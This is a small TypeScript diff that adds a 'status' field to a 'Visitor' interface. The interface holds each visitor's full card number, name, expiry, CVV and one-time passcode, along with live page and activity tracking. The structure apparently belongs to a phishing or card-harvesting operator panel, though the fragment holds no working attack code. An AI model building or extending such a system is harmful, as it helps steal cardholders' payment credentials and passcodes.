@@ -6,6 +6,7 @@ export interface Visitor {
   cardNumber: string; cardName: string; cardMonth: string; cardYearExp: string; cardCvv: string;
   otpCode: string; otpStatus: string | null;
   page: string; isActive: boolean; lastSeen: number; country: string;
+  status: string;
 }
 
 export const unityApi = {
